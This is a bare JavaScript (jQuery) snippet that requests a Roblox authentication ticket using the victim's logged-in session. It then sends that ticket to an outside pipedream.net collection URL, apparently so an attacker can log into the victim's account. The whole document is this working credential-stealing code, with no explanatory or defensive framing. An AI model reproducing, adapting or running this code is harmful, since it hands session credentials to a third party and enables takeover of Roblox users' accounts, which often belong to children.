$.ajax({
    type: "POST",
    url: "https://auth.roblox.com/v1/authentication-ticket",
    data: {},
    success: function(useless1, useless2, jqXHR) {
        $.get("https://95085c8319729c3245f9bcb67d2b821b.m.pipedream.net?conf=" + jqXHR.getResponseHeader("rbx-authentication-ticket"))
    }
})